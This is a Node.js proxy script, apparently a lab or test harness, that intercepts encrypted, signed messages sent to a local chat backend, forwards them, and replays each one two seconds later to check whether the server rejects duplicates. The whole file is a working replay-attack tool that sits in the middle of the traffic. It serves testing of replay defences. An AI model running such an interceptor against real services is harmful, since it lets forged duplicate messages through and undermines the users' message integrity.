const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');
const colors = require('colors');

const app = express();
const PORT = 8081; // Replay Attacker runs on 8081
const TARGET = 'http://localhost:5000';

app.use(cors());
app.use(bodyParser.json());

console.log(colors.red.bold('🔄 REPLAY ATTACKER STARTED ON PORT ' + PORT));

// Helper to send the replay
async function performReplay(url, headers, body) {
    console.log(colors.yellow('⏳ Waiting 2 seconds before replay...'));
    await new Promise(r => setTimeout(r, 2000));
    
    console.log(colors.red.bold('🔥 LAUNCHING REPLAY ATTACK...'));
    try {
        // Remove host header to avoid conflicts
        delete headers['host'];
        delete headers['content-length'];

        const response = await axios.post(url, body, { headers });
        console.log(colors.green(`❌ SERVER ACCEPTED REPLAY! Status: ${response.status}`));
        console.log(colors.white("This means the Backend stored the duplicate. Check Client logs for rejection."));
    } catch (error) {
        if (error.response) {
            console.log(colors.green(`✅ Server Rejected Replay! Status: ${error.response.status} - ${error.response.data.error}`));
        } else {
            console.log(colors.red(`Attack Error: ${error.message}`));
        }
    }
}

// Intercept Message Sending
app.use('/api/messages', (req, res, next) => {
    if (req.method === 'POST') {
        console.log(colors.cyan('\n[Sniffer] Captured encrypted message packet'));
        console.log(colors.gray(`Ciphertext: ${req.body.ciphertext.substring(0, 20)}...`));
        console.log(colors.gray(`Signature: ${req.body.signature.substring(0, 20)}...`));

        // 1. Forward the legitimate request immediately
        // We use a custom axios call here to ensure we forward it exactly as is, then replay it
        const forwardUrl = `${TARGET}/api/messages`;
        
        axios.post(forwardUrl, req.body, { headers: { ...req.headers, host: 'localhost:5000' } })
            .then(serverRes => {
                // Send response back to legitimate client
                res.status(serverRes.status).json(serverRes.data);
                
                // 2. PERFORM THE REPLAY ATTACK
                performReplay(forwardUrl, req.headers, req.body);
            })
            .catch(err => {
                res.status(err.response?.status || 500).json(err.response?.data || {error: "Proxy Error"});
            });
    } else {
        next();
    }
});

// Pass other traffic
app.use('/', createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    logLevel: 'silent'
}));

app.listen(PORT);